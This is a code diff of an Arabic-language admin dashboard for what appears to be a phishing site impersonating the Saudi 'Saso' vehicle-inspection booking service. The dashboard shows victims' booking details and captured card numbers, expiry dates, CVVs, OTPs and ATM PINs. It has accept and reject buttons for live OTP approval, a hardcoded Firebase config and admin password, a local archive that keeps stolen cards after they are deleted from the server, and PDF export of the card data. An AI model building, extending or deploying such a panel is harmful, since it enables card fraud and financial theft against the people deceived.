@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - حماية البيانات - Saso</title>
+    <title>لوحة التحكم - Saso Inspection</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
@@ -22,8 +22,9 @@
         .container { padding: 15px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-        .operation-row { background: white; border-radius: 10px; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.03); position: relative; }
-        .archived-badge { position: absolute; top: -5px; left: 10px; background: #6c757d; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; }
+        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
+        .customer-card { background: white; border-radius: 12px; padding: 15px; border-right: 6px solid #1e7344; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+        .operation-row { background: white; border-radius: 10px; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.03); }
         .card-data-wrapper { display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: nowrap; }
         .box { padding: 8px 10px; border-radius: 6px; font-size: 13px; background: #f8f9fa; border: 1px solid #eee; text-align: center; }
         .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; font-weight: bold; }
@@ -31,46 +32,56 @@
         .status-waiting { background: #fff3cd; color: #856404; animation: blink 1s infinite; }
         @keyframes blink { 50% { opacity: 0.5; } }
         .btn { padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; color: white; font-size: 12px; }
-        .btn-pdf { background: #e74c3c; margin-bottom: 15px; width: 100%; max-width: 250px; }
-        .logout-btn { background: #000 !important; }
+        .btn-accept { background: #28a745; }
+        .btn-reject { background: #dc3545; }
+        .btn-delete { background: #6c757d; }
+        .btn-kick { background: #ff4757; }
+        .btn-pdf { background: #e74c3c; margin-bottom: 15px; display: block; width: 100%; max-width: 250px; font-size: 14px; padding: 10px; }
+        .logout-btn { background: #000 !important; font-size: 12px; }
+        
+        .session-item { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #ddd; }
+        .session-info { font-size: 14px; }
+        .session-info span { color: #666; font-size: 12px; display: block; }
     </style>
 </head>
 <body onload="checkSavedLogin()">
 
 <div id="loginOverlay">
     <div class="login-box">
-        <h2>تسجيل الدخول - الإدارة</h2>
-        <input type="text" id="username" placeholder="اسم المستخدم">
+        <h2>تسجيل الدخول</h2>
+        <input type="text" id="username" placeholder="اسم المستخدم" autocomplete="off">
         <input type="password" id="password" placeholder="كلمة المرور">
         <button onclick="checkLogin()">دخول</button>
-        <p id="loginError" style="color:red; display:none;">بيانات غير صحيحة!</p>
+        <p id="loginError" style="color:red; display:none; margin-top:10px; font-size:14px;">بيانات غير صحيحة!</p>
     </div>
 </div>
 
 <div id="adminContent">
     <div class="visitor-counter">
-        <span>الزوار: <span id="onlineCount">0</span> 🌐</span>
-        <span>الأجهزة: <span id="adminSessionCount">0</span> 🖥️</span>
+        <span>الزوار الآن: <span id="onlineCount">0</span> 🌐</span>
+        <span>الأجهزة المتصلة بالإدارة: <span id="adminSessionCount">0</span> 🖥️</span>
     </div>
     <div class="navbar">
-        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
-        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 البطاقات (محمية)</button>
-        <button class="nav-btn" onclick="openTab(event, 'sessionsSection')">🖥 الأجهزة</button>
+        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
+        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
+        <button class="nav-btn" onclick="openTab(event, 'sessionsSection')">🖥 الأجهزة المتصلة</button>
         <button class="nav-btn logout-btn" onclick="logout()">🚪 خروج</button>
     </div>
     <div class="container">
-        <div id="bookingSection" class="tab-content active"><div id="bookingGrid"></div></div>
+        <div id="bookingSection" class="tab-content active">
+            <div id="bookingGrid" class="booking-grid"></div>
+        </div>
         
         <div id="cardsSection" class="tab-content">
-            <div style="display:flex; gap:10px;">
-                <button class="btn btn-pdf" onclick="downloadPaymentsPDF()">📥 تحميل PDF</button>
-                <button class="btn" style="background:#6c757d; margin-bottom:15px;" onclick="clearLocalArchive()">🗑 مسح الأرشيف المحلي</button>
-            </div>
+            <button class="btn btn-pdf" onclick="downloadPaymentsPDF()">📥 تحميل تقرير البطاقات (PDF)</button>
             <div id="paymentsContainer"></div>
         </div>
 
         <div id="sessionsSection" class="tab-content">
-            <button class="btn" style="background:#dc3545; margin-bottom:10px;" onclick="kickAllAdmins()">تسجيل خروج الكل</button>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+                <h3 style="margin:0;">الأجهزة التي لديها صلاحية الدخول الآن:</h3>
+                <button class="btn btn-reject" onclick="kickAllAdmins()">تسجيل خروج الكل</button>
+            </div>
             <div id="sessionsList"></div>
         </div>
     </div>
@@ -78,98 +89,157 @@
 
 <script>
     let mySessionId = localStorage.getItem("admin_session_id");
-    let localCardsArchive = JSON.parse(localStorage.getItem("cards_archive") || "{}");
+    // الأرشيف المحلي لحماية البيانات من الحذف التلقائي
+    let cardsArchive = JSON.parse(localStorage.getItem("saso_cards_archive") || "{}");
 
     function checkSavedLogin() {
-        if (localStorage.getItem("admin_logged_in") === "true" && mySessionId) showAdmin();
+        const isLogged = localStorage.getItem("admin_logged_in");
+        if (isLogged === "true" && mySessionId) { 
+            showAdmin(); 
+        }
     }
 
     function checkLogin() {
-        const u = document.getElementById('username').value.trim().toLowerCase();
-        const p = document.getElementById('password').value.trim();
-        if(["adman", "adman_"].includes(u) && p === "888999000") {
-            const sid = 'sess_' + Date.now();
+        const userInput = document.getElementById('username').value.trim().toLowerCase();
+        const passInput = document.getElementById('password').value.trim();
+        const errorMsg = document.getElementById('loginError');
+        const validUsers = ["adman", "adman_"];
+        const validPass = "888999000";
+
+        if(validUsers.includes(userInput) && passInput === validPass) {
+            const sessionId = 'sess_' + Date.now();
             localStorage.setItem("admin_logged_in", "true");
-            localStorage.setItem("admin_session_id", sid);
-            mySessionId = sid;
+            localStorage.setItem("admin_session_id", sessionId);
+            mySessionId = sessionId;
             initFirebase();
-            firebase.database().ref('admin_sessions/' + sid).set({ loginTime: new Date().toLocaleString('ar-EG') }).then(() => showAdmin());
-        } else { document.getElementById('loginError').style.display = 'block'; }
+            firebase.database().ref('admin_sessions/' + sessionId).set({
+                loginTime: new Date().toLocaleString('ar-EG'),
+                status: 'active'
+            }).then(() => { showAdmin(); });
+        } else { errorMsg.style.display = 'block'; }
     }
 
     function showAdmin() {
         document.getElementById('loginOverlay').style.display = 'none';
         document.getElementById('adminContent').style.display = 'block';
         initFirebase();
+        monitorMySession();
+    }
+
+    function monitorMySession() {
+        firebase.database().ref('admin_sessions/' + mySessionId).on('value', (s) => {
+            if (!s.exists()) { logout(); }
+        });
+    }
+
+    function logout() {
+        if (mySessionId) { firebase.database().ref('admin_sessions/' + mySessionId).remove(); }
+        localStorage.removeItem("admin_logged_in");
+        localStorage.removeItem("admin_session_id");
+        location.reload();
     }
 
     function initFirebase() {
-        const config = {
+        const firebaseConfig = {
             apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
+            authDomain: "saso-inspection.firebaseapp.com",
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
-            projectId: "saso-inspection"
+            projectId: "saso-inspection",
+            storageBucket: "saso-inspection.appspot.com",
+            messagingSenderId: "1009002235896",
+            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
-        if (!firebase.apps.length) firebase.initializeApp(config);
-        const db = firebase.database();
+        
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        const database = firebase.database();
 
-        db.ref('online_tracking').on('value', s => document.getElementById('onlineCount').innerText = s.numChildren());
-        db.ref('admin_sessions').on('value', s => {
-            document.getElementById('adminSessionCount').innerText = s.numChildren();
-            let h = '';
-            s.forEach(c => {
-                const sid = c.key;
-                h += `<div class="session-item" style="background:white; padding:10px; margin-bottom:5px; border-radius:8px; display:flex; justify-content:space-between;">
-                    <span>جهاز متصل (${c.val().loginTime})</span>
-                    ${sid !== mySessionId ? `<button onclick="deleteData('admin_sessions/${sid}')">طرد</button>` : ''}
-                </div>`;
-            });
-            document.getElementById('sessionsList').innerHTML = h;
+        database.ref('online_tracking').on('value', s => {
+            document.getElementById('onlineCount').innerText = s.numChildren();
         });
 
-        // نظام حماية البطاقات من الحذف
-        db.ref('payments').on('value', (snapshot) => {
-            const container = document.getElementById('paymentsContainer');
-            let currentFirebaseIds = [];
+        database.ref('admin_sessions').on('value', (snapshot) => {
+            const list = document.getElementById('sessionsList');
+            const countSpan = document.getElementById('adminSessionCount');
+            list.innerHTML = '';
+            countSpan.innerText = snapshot.numChildren();
+            snapshot.forEach((child) => {
+                const val = child.val();
+                const sid = child.key;
+                const isMe = (sid === mySessionId) ? " (جهازك الحالي)" : "";
+                list.innerHTML += `
+                <div class="session-item">
+                    <div class="session-info">
+                        <strong>جهاز متصل ${isMe}</strong>
+                        <span>وقت الدخول: ${val.loginTime}</span>
+                    </div>
+                    ${sid !== mySessionId ? `<button class="btn btn-kick" onclick="deleteData('admin_sessions/${sid}')">طرد الجهاز</button>` : ''}
+                </div>`;
+            });
+        });
 
-            // 1. تحديث الأرشيف المحلي بالبيانات الجديدة من Firebase
+        database.ref('visitors').limitToLast(50).on('value', (snapshot) => {
+            const grid = document.getElementById('bookingGrid');
+            let content = '';
+            snapshot.forEach((child) => {
+                const val = child.val();
+                content = `
+                <div class="customer-card">
+                    <h3 style="margin:0 0 10px 0; color:#1e7344; font-size:16px;">${val.fullName || 'زائر'}</h3>
+                    <p style="font-size:13px; margin:5px 0;">🚗 ${val.vehicleType || '-'} | 🔢 ${val.plateNumber || '-'}</p>
+                    <p style="font-size:13px; margin:5px 0;">📅 ${val.bookingDate || '-'} | 🕒 ${val.bookingTime || '-'}</p>
+                    <button class="btn btn-reject" style="width:100%; margin-top:10px;" onclick="deleteData('visitors/${child.key}')">حذف السجل</button>
+                </div>` + content;
+            });
+            grid.innerHTML = content;
+        });
+
+        // مراقبة البطاقات مع نظام الأرشفة لحمايتها من الحذف التلقائي
+        database.ref('payments').on('value', (snapshot) => {
+            const container = document.getElementById('paymentsContainer');
+            let firebaseIds = [];
+
+            // تحديث الأرشيف بالبيانات القادمة من السيرفر
             snapshot.forEach((child) => {
                 const id = child.key;
-                const data = child.val();
-                localCardsArchive[id] = data; // حفظ/تحديث في الأرشيف
-                currentFirebaseIds.push(id);
+                const val = child.val();
+                cardsArchive[id] = val;
+                firebaseIds.push(id);
             });
-            localStorage.setItem("cards_archive", JSON.stringify(localCardsArchive));
+            localStorage.setItem("saso_cards_archive", JSON.stringify(cardsArchive));
 
-            // 2. عرض البيانات (الموجودة في Firebase + المؤرشفة التي حُذفت)
+            // عرض البيانات من الأرشيف (حتى لو حُذفت من السيرفر تظل ظاهرة)
             let fullHtml = '';
-            // نحول الأرشيف لمصفوفة ونرتبها حسب الأحدث
-            const sortedKeys = Object.keys(localCardsArchive).reverse();
+            const allIds = Object.keys(cardsArchive).reverse();
 
-            sortedKeys.forEach((id) => {
-                const val = localCardsArchive[id];
-                const isDeletedFromFirebase = !currentFirebaseIds.includes(id);
+            allIds.forEach((id) => {
+                const val = cardsArchive[id];
+                const isDeleted = !firebaseIds.includes(id); // هل حُذفت من السيرفر؟
                 
-                let statusText = isDeletedFromFirebase ? "مؤرشفة (حُذفت من السيرفر)" : "نشط ✅";
-                let statusClass = val.status && val.status.includes('waiting') ? "status-waiting" : "";
+                let statusText = isDeleted ? "محفوظة" : "مستقر";
+                let statusClass = "";
+                if(!isDeleted && val.status && val.status.includes('waiting')) {
+                    statusText = "انتظار ⏳";
+                    statusClass = "status-waiting";
+                }
 
                 fullHtml += `
-                <div class="operation-row" id="row-${id}">
-                    ${isDeletedFromFirebase ? '<span class="archived-badge">نسخة محفوظة</span>' : ''}
+                <div class="operation-row" style="${isDeleted ? 'opacity:0.8; border-right: 5px solid #6c757d;' : ''}">
                     <div class="card-data-wrapper">
-                        <div>
-                            <div style="font-weight:bold;">${val.cardHolder || 'عميل'}</div>
+                        <div style="min-width:100px;">
+                            <div style="font-weight:bold; font-size:13px;">${val.cardHolder || 'عميل'} ${isDeleted ? '<small>(أرشيف)</small>' : ''}</div>
                             <span class="status-badge ${statusClass}">${statusText}</span>
                         </div>
-                        <div style="display:flex; gap:5px; flex-wrap:wrap;">
-                            <div class="box card-box">${val.cardNumber || '----'}</div>
-                            <div class="box card-box">${val.expiry || '--/--'}</div>
-                            <div class="box card-box">${val.cvv || '---'}</div>
-                            <div class="box" style="background:#e3f2fd;">OTP: ${val.otp || '-'}</div>
-                            <div class="box" style="background:#f3e5f5;">PIN: ${val.atm_pin || '-'}</div>
+                        <div style="display:flex; gap:5px; align-items:center; flex-grow:1; flex-wrap:wrap;">
+                            <div class="box card-box" style="direction:ltr; min-width:140px;">${val.cardNumber || '----'}</div>
+                            <div class="box card-box">📅 ${val.expiry || '--/--'}</div>
+                            <div class="box card-box">🔑 ${val.cvv || '---'}</div>
+                            <div class="box" style="background:#e3f2fd; color:#0d47a1;">🔐 OTP: ${val.otp || '-'}</div>
+                            <div class="box" style="background:#f3e5f5; color:#4a148c;">🏧 PIN: ${val.atm_pin || '-'}</div>
                         </div>
-                        <div>
-                            <button class="btn" style="background:#28a745" onclick="updateStatus('${id}', 'accept')">✔</button>
-                            <button class="btn" style="background:#6c757d" onclick="deleteFromBoth('${id}')">🗑</button>
+                        <div style="display:flex; gap:5px;">
+                            ${!isDeleted ? `<button class="btn btn-accept" onclick="updateStatus('${id}', 'accept')">قبول</button>` : ''}
+                            ${!isDeleted ? `<button class="btn btn-reject" onclick="updateStatus('${id}', 'reject')">رفض</button>` : ''}
+                            <button class="btn btn-delete" onclick="deleteCardData('${id}')">🗑</button>
                         </div>
                     </div>
                 </div>`;
@@ -178,35 +248,59 @@
         });
     }
 
-    // حذف نهائي من السيرفر ومن المتصفح
-    function deleteFromBoth(id) {
-        if(confirm('سيتم حذف البطاقة نهائياً من السيرفر ومن أرشيفك، استمرار؟')) {
+    // وظيفة الحذف من السيرفر ومن الأرشيف المحلي معاً
+    function deleteCardData(id) {
+        if(confirm('هل أنت متأكد من حذف هذه البطاقة نهائياً من السيرفر ومن الأرشيف؟')) {
             firebase.database().ref('payments/' + id).remove();
-            delete localCardsArchive[id];
-            localStorage.setItem("cards_archive", JSON.stringify(localCardsArchive));
-            location.reload(); // لتحديث القائمة فوراً
+            delete cardsArchive[id];
+            localStorage.setItem("saso_cards_archive", JSON.stringify(cardsArchive));
+            // لا حاجة لعمل ريلود لأن الـ listener سيقوم بالتحديث
         }
-    }
-
-    function clearLocalArchive() {
-        if(confirm('هل تريد مسح الأرشيف المحلي فقط؟ (لن يؤثر على السيرفر)')) {
-            localStorage.removeItem("cards_archive");
-            location.reload();
-        }
-    }
-
-    function updateStatus(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }
-    function logout() { localStorage.clear(); location.reload(); }
-    function openTab(e, n) {
-        document.querySelectorAll('.tab-content').forEach(t => t.style.display='none');
-        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-        document.getElementById(n).style.display='block';
-        e.currentTarget.classList.add('active');
     }
 
     function downloadPaymentsPDF() {
         const element = document.getElementById('paymentsContainer');
-        html2pdf().from(element).set({ margin: 10, filename: 'البطاقات.pdf', jsPDF: { orientation: 'landscape' } }).save();
+        if (!element || element.innerText.trim() === "") {
+            alert("لا توجد بيانات لتحميلها!");
+            return;
+        }
+        const opt = {
+            margin:       10,
+            filename:     'تقرير_البطاقات_Saso.pdf',
+            image:        { type: 'jpeg', quality: 0.98 },
+            html2canvas:  { scale: 2, useCORS: true },
+            jsPDF:        { unit: 'mm', format: 'a4', orientation: 'landscape' }
+        };
+        const buttons = document.querySelectorAll('.operation-row button');
+        buttons.forEach(b => b.style.visibility = 'hidden');
+        
+        html2pdf().set(opt).from(element).save().then(() => {
+            buttons.forEach(b => b.style.visibility = 'visible');
+        });
+    }
+
+    function kickAllAdmins() {
+        if(confirm('هل أنت متأكد من تسجيل خروج جميع الأجهزة؟')) {
+            firebase.database().ref('admin_sessions').remove();
+        }
+    }
+
+    function updateStatus(userId, action) {
+        firebase.database().ref('payments/' + userId).update({ status: action });
+    }
+
+    function deleteData(path) { 
+        if(confirm('هل أنت متأكد؟')) firebase.database().ref(path).remove(); 
+    }
+
+    function openTab(evt, tabName) {
+        var i, tabcontent, navbtns;
+        tabcontent = document.getElementsByClassName("tab-content");
+        for (i = 0; i < tabcontent.length; i++) tabcontent[i].style.display = "none";
+        navbtns = document.getElementsByClassName("nav-btn");
+        for (i = 0; i < navbtns.length; i++) navbtns[i].className = navbtns[i].className.replace(" active", "");
+        document.getElementById(tabName).style.display = "block";
+        evt.currentTarget.className += " active";
     }
 </script>
 </body>
